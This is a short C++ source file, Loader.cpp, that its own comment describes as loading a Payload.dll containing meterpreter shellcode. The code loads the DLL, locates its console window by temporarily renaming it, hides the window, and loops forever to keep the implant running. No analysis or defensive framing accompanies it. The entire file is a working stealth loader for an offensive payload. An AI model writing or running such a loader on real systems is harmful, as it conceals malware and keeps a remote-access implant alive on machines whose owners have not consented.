/* Loader.cpp 
   ==========
   This console application loads Payload.dll which contains the main
   meterpreter shellcode to run.     
*/
#include <iostream>
#include <Windows.h>
#include <WinUser.h>

HWND GetConsoleHwnd(void)
{
    HWND hwndFound;     
    SetConsoleTitle(L"sneakygeek");
    Sleep(40);
    hwndFound = FindWindow(NULL, L"sneakygeek");
    SetConsoleTitle(L"somethingelse");
    return(hwndFound);
}

int main()
{
    HMODULE PayloadDLL;
    HWND hConsole;
    PayloadDLL = LoadLibrary(L"Payload.dll");
    printf("I live forever\n");
    hConsole = GetConsoleHwnd();
    ShowWindow(hConsole, SW_HIDE);
	while (1) {
        // infinite loop to keep thread alive.
	}
}